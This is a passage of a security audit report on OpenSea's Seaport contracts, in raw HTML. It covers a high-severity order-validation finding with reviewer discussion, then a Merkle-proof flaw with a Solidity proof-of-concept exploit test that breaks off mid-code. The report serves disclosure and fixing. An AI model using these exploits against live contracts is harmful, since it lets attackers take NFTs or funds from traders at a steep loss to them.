overflow).<br>\nCall <code>matchOrders()</code>. Via calls to <code>_matchAdvancedOrders()</code>, <code>_fulfillAdvancedOrders()</code>, <code>_applyFulfillment()</code>, <code>_aggregateValidFulfillmentOfferItems()</code> will be called.<br>\nThe <code>errorBuffer</code> will get a value of 3  (the <code>or</code> of 1 and 2).<br>\nAs the value of 3 is not detected, no error will be thrown and the order will be executed, including the mal formed values.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Change the check on <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L465\">FulfillmentApplier.sol#L465</a>  to consider <code>case 3</code>.</li>\n<li>Potential option: Introduce an early abort in case <code>errorBuffer != 0</code> on <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L338\">FulfillmentApplier.sol#L338</a></li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75\">0age (OpenSea) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75\">HardlyDifficult (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75#issuecomment-1172848110\">cmichel (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>This validation error could lead to fulfilling an order with a consideration (potentially ~0) lower than expected.</p>\n</blockquote>\n<p>That’s correct, you can use this to fulfill an order essentially for free, that’s why I’d consider this high severity.\nThey could have done a better job demonstrating it with a POC test case but this sentence imo shows that they were aware of the impact.</p>\n<p>See <a href=\"https://github.com/ProjectOpenSea/seaport/blob/5c6a628cb152d731e956682dd748d30e8bf1f1c9/test/findings/FulfillmentOverflowWithMissingItems.spec.ts#L136\">this test case</a> showing how to buy an NFT for 1 DAI instead of 1000 DAI.</p>\n</blockquote>\n<p><strong>0age (OpenSea) disagreed with Medium severity:</strong></p>\n<blockquote>\n<p>This is the highest-severity finding. If it were me, I’d switch this to high.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75\">HardlyDifficult (judge) increased severity to High</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75#issuecomment-1183115107\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After further consideration and discussion with @HardlyDifficult, we agree with @cmichel that this should be of high severity. As the protocol allows for invalid orders to be created, users aware of this vulnerability will be able to fulfill an order at a considerable discount. This fits the criteria of a high severity issue as it directly leads to lost funds.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75\">0age (OpenSea) resolved</a>:</strong></p>\n<blockquote>\n<p>PR: <a href=\"https://github.com/ProjectOpenSea/seaport/pull/320\">ProjectOpenSea/seaport#320</a></p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-2\" style=\"position:relative;\"><a href=\"#medium-risk-findings-2\" aria-label=\"medium risk findings 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (2)</h1>\n<h2 id=\"m-01-merkle-tree-criteria-can-be-resolved-by-wrong-tokenids\" style=\"position:relative;\"><a href=\"#m-01-merkle-tree-criteria-can-be-resolved-by-wrong-tokenids\" aria-label=\"m 01 merkle tree criteria can be resolved by wrong tokenids permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168\">[M-01] Merkle Tree criteria can be resolved by wrong tokenIDs</a></h2>\n<p><em>Submitted by cmichel, also found by frangio and Spearbit</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157\">CriteriaResolution.sol#L157</a><br></p>\n<p>The protocol allows specifying several tokenIds to accept for a single offer.<br>\nA merkle tree is created out of these tokenIds and the root is stored as the <code>identifierOrCriteria</code> for the item.<br>\nThe fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.<br></p>\n<p>There are no real verifications on the merkle proof that the supplied tokenId is indeed <strong>a leaf of the merkle tree</strong>.<br>\nIt’s possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.<br></p>\n<p>This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria.<br>\nUsually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.</p>\n<h3 id=\"example\" style=\"position:relative;\"><a href=\"#example\" aria-label=\"example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example</h3>\n<p>Alice wants to buy either NFT with tokenId 1 or tokenId 2.<br>\nShe creates a merkle tree of it and the root is <code>hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0</code>.<br>\nShe creates an offer for this criteria.<br>\nAn attacker can now acquire the NFT with tokenId <code>0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0</code> (or, generally, any other intermediate hash value) and fulfill the trade.</p>\n<blockquote>\n<p>One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard.</p>\n<p>“While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a ‘black box’.” <a href=\"https://eips.ethereum.org/EIPS/eip-721\">EIP721</a></p>\n<p>Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal <code>_mint(address to, uint256 id)</code> functions that allow specifying an arbitrary <code>id</code>. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions.<br>\nTherefore, ERC721-compliant token contracts are vulnerable to this attack.</p>\n</blockquote>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here’s a <code>forge</code> test (<a href=\"https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6\">gist</a>) that shows the issue for the situation mentioned in <em>Example</em>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BugMerkleTree</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BaseOrderTest</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Context</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ConsiderationInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenCriteria</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">paymentAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zone</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zoneHash</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">hashHashes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hash1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hash2</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// see MerkleProof.verify</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">encoding</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">hash1</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">hash2</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">encoding</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">hash2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">encoding</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">hash1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">encoding</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testMerkleTreeBug</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">resetTokenBalancesBetweenRuns</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leafLeft</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leafRight</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">hashHashes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">leafLeft</span><span class=\"mtk1\">, </span><span class=\"mtk12\">leafRight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">logBytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Context</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">context</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Context</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">, </span><span class=\"mtk3\">/* tokenCriteria */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk3\">/* paymentAmount */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk3\">/* zone */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk3\">/* zoneHash */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk3\">/* salt */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">conduitKey</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">), </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">paymentAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit assume there&#39;s a token where anyone can acquire IDs. smaller IDs are more valuable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// we acquire the merkle root ID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">test721_1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_configureERC20OfferItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// start, end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">paymentAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">paymentAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_configureConsiderationItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ERC721_WITH_CRITERIA</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">test721_1</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// @audit set merkle root for NFTs we want to accept</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenCriteria</span><span class=\"mtk1\">), </span><span class=\"mtk3\">/* identifierOrCriteria */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">alice</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">OrderParameters</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zone</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">offerItems</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">OrderType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FULL_OPEN</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zoneHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">conduitKey</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">OrderComponents</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderComponents</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getOrderComponents</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getNonce</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOrderHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">orderComponents</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">signOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">alicePk</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">orderHash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">offerItems</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span 